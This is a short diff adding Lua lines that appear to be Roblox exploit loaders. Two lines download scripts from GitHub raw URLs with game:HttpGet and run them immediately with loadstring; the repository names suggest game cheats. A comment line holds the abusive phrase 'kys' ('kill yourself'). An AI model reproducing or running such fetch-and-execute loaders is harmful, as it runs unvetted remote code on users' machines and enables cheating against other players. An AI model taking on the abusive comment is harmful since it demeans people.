@@ -1,0 +1,3 @@
+--kys 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/angeloX041/0XIGENWARE/main/VORTZ'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/lockv2hc/main/lockv2hc", true))()
